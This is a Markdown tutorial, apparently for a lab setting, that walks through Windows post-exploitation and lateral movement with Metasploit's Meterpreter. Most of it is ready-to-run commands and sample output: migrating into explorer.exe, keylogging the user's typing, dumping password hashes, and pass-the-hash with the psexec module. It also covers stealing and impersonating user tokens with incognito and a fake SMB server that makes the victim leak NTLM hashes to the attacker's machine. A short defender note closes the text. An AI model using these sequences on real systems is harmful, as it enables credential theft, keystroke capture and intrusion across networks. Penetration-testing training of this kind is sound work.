# Post-Exploitation with Meterpreter & Lateral Movement (Windows)

---

## 1. Using Meterpreter after exploitation

### 1.1 Who am I? (checking your current privileges)

InMeterpreter session:

```bash
meterpreter > getuid
```

Example output:

> `Server username: NT AUTHORITY\SYSTEM`

This tells you you’re running as **SYSTEM**, which is the highest local privilege on a Windows machine (roughly "root").

---

### 1.2 Which process am I in?

You usually land inside a service process (e.g., `svchost.exe`). It’s often better to **migrate** to a more stable, user-facing process like `explorer.exe`.

Check your current process and list all processes:

```bash
meterpreter > getpid
meterpreter > ps
```

Example:

> `Current pid: 1480`
> `1480  844   svchost.exe  x86   0        NT AUTHORITY\SYST EM  C:\WINDOWS\System32\svchost.exe`

From the `ps` output, identify the PID for `explorer.exe`, which will belong to the logged-in user (that’s where keyboard input lives).

---

### 1.3 Migrating into the user’s Explorer process

Once you know the PID for `explorer.exe` (say it’s `1420`), migrate into it:

```bash
meterpreter > migrate 1420
```

If it succeeds, Meterpreter is now injected into `explorer.exe`. This is very useful for:

* More stable sessions.
* Keylogging (you see what the user types in their session).
* Capturing credentials as the user uses them.

You can also use the built-in helper:

```bash
meterpreter > run migrate -f
```

`-f` tries to automatically find a good process and force a migration.

---

### 1.4 Using the keylogger

Now that you’re inside `explorer.exe`, you can start logging keystrokes.

Start the keylogger:

```bash
meterpreter > keyscan_start
```

Let the user type for a while (logins, browsing, etc.), then dump the captured keys:

```bash
meterpreter > keyscan_dump
```

When you’re done:

```bash
meterpreter > keyscan_stop
```

Because you’re inside `explorer.exe`, you see *everything the user types*: passwords, commands, URLs, etc.

---

### 1.5 Exploring processes and system info (IRB / Ruby API)

Meterpreter also exposes a Ruby API via `irb`:

```bash
meterpreter > irb
>> client.sys.process.get_processes
```

This prints a Ruby structure with all processes (similar to `ps` but scriptable). You can:

* Iterate processes,
* Filter by name,
* Grab PIDs programmatically.

Exit IRB with `exit` or `Ctrl+D`.

---

### 1.6 Dropping to a system shell & checking local users

Sometimes you just want a classic Windows shell:

```bash
meterpreter > shell
C:\WINDOWS\system32>
```

Now you’re in a `cmd.exe` shell as **SYSTEM**. From here, enumerate users and admins:

```cmd
C:\WINDOWS\system32> net users
C:\WINDOWS\system32> net localgroup Administradores
```

(or `Administrators` depending on OS language)

This helps you:

* Identify accounts worth impersonating or attacking.
* Confirm if there are local admin / domain accounts on the box.

---

## 2. Lateral Movement – Windows to Windows (PSExec & hashes)

Once you’ve got **SYSTEM** and maybe some hashes, the next step is: **move to other machines**.

### 2.1 Using PSExec via Metasploit

**PSExec** lets you execute commands on a remote Windows host over SMB using valid credentials (or hashes).

First, make sure the Windows target is configured for classic network authentication:

On the Windows target:

1. Run `secpol.msc` (Local Security Policy).
2. Go to:
   **Local Policies -> Security Options -> "Network access: Sharing and security model for local accounts"**
3. Set it to **Classic**.

Back in Metasploit, from your Kali box:

```bash
msf > back
msf > use exploit/windows/smb/psexec

msf exploit(windows/smb/psexec) > set RHOSTS 192.168.0.100     
msf exploit(windows/smb/psexec) > set LHOST 192.168.0.1        

msf exploit(windows/smb/psexec) > set SMBUser admin
msf exploit(windows/smb/psexec) > set SMBPass admin1

msf exploit(windows/smb/psexec) > exploit
```

If the credentials are valid and SMB is accessible, you get a new Meterpreter session on the **remote** machine.

---

### 2.2 Dumping hashes and passing the hash

From your initial Meterpreter session on the first machine:

```bash
meterpreter > hashdump
```

You’ll see lines like:

```text
admin:500:aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a:::
```

The interesting part is the **NTLM hash** (the second long hex string).

You can now use **pass-the-hash** with PSExec:

```bash
msf exploit(windows/smb/psexec) > set SMBUser admin
msf exploit(windows/smb/psexec) > set SMBPass cc36cf7a8514893efccd332446158b1a
msf exploit(windows/smb/psexec) > exploit
```

Metasploit’s module understands you’re giving it a hash instead of a cleartext password and will authenticate accordingly.

> Result: you **don’t need the actual password**, only the hash.

---

## 3. SSHExec for Linux – lateral movement to Linux

On the Linux side, the idea is similar: if you have credentials for a Linux machine:

* You can use plain `ssh` from a shell.
* Or use Metasploit’s `auxiliary/scanner/ssh/ssh_login` or `exploit/multi/ssh/ssh_login` to get sessions.

Example from a Meterpreter shell:

```bash
ssh user@192.168.0.200
```

Or in Metasploit:

```bash
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set RHOSTS 192.168.0.200
msf auxiliary(ssh_login) > set USERNAME user
msf auxiliary(ssh_login) > set PASSWORD pass123
msf auxiliary(ssh_login) > run
```

Once you’re in, you repeat the same privesc and lateral movement mindset on Linux (linPEAS, SUID, cron, etc.).

---

## 4. Using tokens to pass access control 

Windows uses **access tokens** to represent logged-in users. When a user logs on, the system creates a token and processes that user runs with that token. These tokens often persist until logout or reboot.

As an attacker with **SYSTEM**, you can **steal and impersonate** these tokens to "become" that user.

### 4.1 Loading incognito and listing tokens

In a Meterpreter session on a Windows host:

```bash
meterpreter > load incognito
```

List available tokens:

```bash
meterpreter > list_tokens -u
```

Example output (initially):

```text
Delegation Tokens Available
========================================
GMF-5C162F16F3A\admin
NT AUTHORITY\Servicio de red
NT AUTHORITY\SERVICIO LOCAL
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available
```

Later, after another user logs on (e.g., `ehacker`), running `list_tokens -u` again:

```text
Delegation Tokens Available
========================================
GMF-5C162F16F3A\admin
GMF-5C162F16F3A\ehacker
NT AUTHORITY\Servicio de red
NT AUTHORITY\SERVICIO LOCAL
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available
```

Now you can impersonate that user.

---

### 4.2 Impersonating a user token

To "become" `ehacker`:

```bash
meterpreter > impersonate_token GMF-5C162F16F3A\\ehacker
```

Output:

```text
[+] Delegation token available
[+] Successfully impersonated user GMF-5C162F16F3A\ehacker
meterpreter > getuid
Server username: GMF-5C162F16F3A\ehacker
```

You’re now running as `ehacker`.

* If `ehacker` is a **domain user**, you can use this identity to:

  * Access network shares on other machines.
  * RDP to servers.
  * Run PSExec onto other systems (depending on their privileges).

This is key to **moving through an Active Directory environment** without always needing passwords.

To revert back to your original token (e.g., SYSTEM):

```bash
meterpreter > rev2self
```

---

## 5. Forcing users to connect to you (fake SMB server)

Sometimes you don’t yet have the tokens. Another trick: make victims **connect to you** via SMB and leak their NTLM hashes.

### 5.1 Start the fake SMB server in Metasploit

From the Metasploit console:

```bash
msf > use auxiliary/server/capture/smb
msf auxiliary(server/capture/smb) > set JOHNPWFILE /home/kali/hashes.txt
msf auxiliary(server/capture/smb) > exploit -j
```

* This starts a fake SMB server on your Kali.
* Any Windows host that tries to connect to `\\192.168.0.1\something` ( Kali IP) will send NTLM authentication.
* The module logs those hashes and writes them to `/home/kali/hashes.txt` in a format suitable for John the Ripper.

---

### 5.2 Make the compromised machine "phone home"

Back in your Meterpreter session:

1. Ensure you’re impersonating a **real user** (e.g., `ehacker`):

   ```bash
   meterpreter > list_tokens -u
   meterpreter > impersonate_token GMF-5C162F16F3A\\ehacker
   meterpreter > shell
   ```

2. From the Windows shell:

   ```cmd
   C:\WINDOWS\system32> net use \\192.168.0.1\foo
   ```

This forces the Windows machine to authenticate to your fake SMB server on Kali. Metasploit captures the NTLM hash in `hashes.txt`.

You can then crack those hashes with John or use them for **pass-the-hash** on other machines.

---

## 6. Putting it all together

1. **Post-exploitation** on the initial Windows victim:

   * Verified your identity (`getuid` -> `NT AUTHORITY\SYSTEM`).
   * Listed and migrated processes (`ps`, `migrate` to `explorer.exe`).
   * Logged keystrokes with `keyscan_start` / `keyscan_dump`.
   * Dropped to a shell and enumerated users/groups.

2. **Lateral movement**:

   * Used PSExec with passwords or hashes to move from one Windows machine to another.
   * Planned Linux lateral movement via SSH/SSHExec.

3. **Token abuse**:

   * Loaded `incognito` and listed tokens.
   * Impersonated a user (`ehacker`) and used their privileges.
   * Understood that domain user tokens allow movement across the domain.

4. **Credential harvesting**:

   * Started a fake SMB server (`auxiliary/server/capture/smb`).
   * Forced the victim to connect with `net use \\attacker\share`.
   * Captured NTLM hashes for offline cracking or pass-the-hash.

From a defenders perspective, this is exactly why:

* You monitor for unusual lateral movement (PSExec, `net use` to strange hosts).
* You restrict who can log into what (admin / domain accounts).
* You protect and monitor high-value assets like **Active Directory**.
* You enable and review logs (PowerShell, Windows Event logs, network flows).

